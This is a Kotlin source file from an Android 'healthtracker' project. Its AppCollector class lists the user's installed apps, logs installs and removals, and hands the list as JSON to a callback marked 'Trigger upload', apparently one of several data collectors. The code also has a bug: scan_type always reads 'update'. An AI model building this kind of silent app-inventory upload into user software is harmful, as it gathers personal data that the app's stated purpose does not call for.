package com.inf2007.healthtracker.utilities.collectors

import android.content.Context
import android.util.Log
import com.inf2007.healthtracker.utilities.PackageLister
import org.json.JSONObject

class AppCollector(private val context: Context, private val onAppsReady: (JSONObject) -> Unit) : DataCollector {
    companion object {
        private const val TAG = "AppCollector"
    }

    private lateinit var packageLister: PackageLister
    private var lastAppList: List<PackageLister.PackageInfo>? = null

    override fun startObserving() {
        packageLister = PackageLister(context)
        packageLister.startListening()
        collect()
        Log.d(TAG, "App observing started")
    }

    override fun stopObserving() {
        if (::packageLister.isInitialized) {
            packageLister.stopListening()
        }
        Log.d(TAG, "App observing stopped")
    }

    override fun collect() {
        // Get current apps
        val currentApps = packageLister.getUserApps()

        // Check if anything changed (original logic)
        if (lastAppList != null) {
            val oldPackages = lastAppList!!.map { it.packageName }.toSet()
            val currentPackages = currentApps.map { it.packageName }.toSet()

            val newApps = currentPackages - oldPackages
            val removedApps = oldPackages - currentPackages

            if (newApps.isNotEmpty()) {
                Log.i(TAG, "New apps installed: $newApps")
            }
            if (removedApps.isNotEmpty()) {
                Log.i(TAG, "Apps uninstalled: $removedApps")
            }
        }

        // Update last list
        lastAppList = currentApps

        val jsonData = packageLister.getUserAppsAsJson()
        jsonData.put("scan_type", if (lastAppList == null) "initial" else "update")

        // Trigger upload
        onAppsReady(jsonData)

        packageLister.saveUserAppsToFile()
    }
}